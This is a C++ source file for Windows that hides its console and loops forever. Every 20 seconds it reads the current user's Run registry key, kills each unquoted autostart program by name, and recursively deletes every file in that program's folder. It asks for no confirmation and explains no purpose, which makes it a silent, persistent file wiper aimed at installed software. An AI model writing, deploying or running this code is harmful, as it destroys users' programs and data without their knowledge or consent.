#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <string>
#include <regex>
#include <TlHelp32.h>
#include <chrono>
#include <thread>

namespace fs = std::filesystem;

void TerminateProcessByName(const wchar_t* processName)
{
    // Get a handle to the process snapshot
    HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcess == INVALID_HANDLE_VALUE)
    {
        return;
    }

    // Initialize the process entry structure
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Iterate over the processes in the snapshot
    if (!Process32First(hProcess, &pe32))
    {
        CloseHandle(hProcess);
        return;
    }

    do
    {
        // Check if the process name matches
        if (_wcsicmp(pe32.szExeFile, processName) == 0)
        {
            // Get a handle to the process
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL)
            {
                // Terminate the process
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
            }
        }
    } while (Process32Next(hProcess, &pe32));

    CloseHandle(hProcess);
}



void delete_files(std::string strPath) {
    fs::current_path(strPath);
    for (auto& entry : fs::recursive_directory_iterator(".")) {
        if (entry.is_regular_file()) {
            fs::remove(entry.path());
        }
    }
}

void splitPathAndFilename(const std::string& fullPath, std::string& path, std::string& filename)
{
    // Find the last occurrence of the path separator
    size_t pos = fullPath.find_last_of('\\');

    if (pos == std::string::npos)
    {
        // No path separator found, the entire string is the filename
        path = "";
        filename = fullPath;
    }
    else
    {
        // Split the string into path and filename
        path = fullPath.substr(0, pos);
        filename = fullPath.substr(pos + 1);
    }
}

wchar_t* convertStringToWideChar(const std::string& str)
{
    int len = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    wchar_t* wideCharStr = new wchar_t[len];
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, wideCharStr, len);
    return wideCharStr;
}

int main(){
    FreeConsole();
    while (true) {     
    
        // Open the "Run" registry key
        HKEY hKey;
        long result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

        if (result == ERROR_SUCCESS)
        {
            // Enumerate the values in the key
            DWORD valueIndex = 0;
            WCHAR valueName[1024];
            DWORD valueNameLength = ARRAYSIZE(valueName);
            BYTE valueData[1024];
            DWORD valueDataLength = ARRAYSIZE(valueData);
            DWORD valueType;
            while (RegEnumValueW(hKey, valueIndex, valueName, &valueNameLength, NULL, &valueType, valueData, &valueDataLength) == ERROR_SUCCESS)
            {
                // Print the value name and data to the console
                std::wcout << L"Name: " << valueName << L", Data: " << (WCHAR*)valueData << std::endl << std::endl;

                // Convert the wide-character string to a regular string
                int convertedSize = WideCharToMultiByte(CP_UTF8, 0, (LPCWSTR)valueData, -1, NULL, 0, NULL, NULL);
                std::string valueDataStr(convertedSize, 0);
                WideCharToMultiByte(CP_UTF8, 0, (LPCWSTR)valueData, -1, &valueDataStr[0], convertedSize, NULL, NULL);

                // Print the converted string to the console
                std::cout << "Converted string: " << valueDataStr << std::endl;

                std::regex pattern("\".*\"");
                if (std::regex_search(valueDataStr, pattern))
                {
                    //std::cout << "The string contains a pair of double quotes" << std::endl;
                
                }
                else
                {
                    //std::cout << "The string does not contain a pair of double quotes" << std::endl;
                    std::string path, filename;
                    splitPathAndFilename(valueDataStr, path, filename);
                    std::cout << path << '\t' << filename << std::endl;
                
                    wchar_t* wideFileName = convertStringToWideChar(filename);
                    TerminateProcessByName(wideFileName);
                    delete[] wideFileName;
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                    delete_files(path);
                }

                // Move on to the next value
                valueIndex++;
                valueNameLength = ARRAYSIZE(valueName);
                valueDataLength = ARRAYSIZE(valueData);
            }

            // Close the registry key
            RegCloseKey(hKey);
        }
        std::this_thread::sleep_for(std::chrono::seconds(20));
    }
    return 0;
}
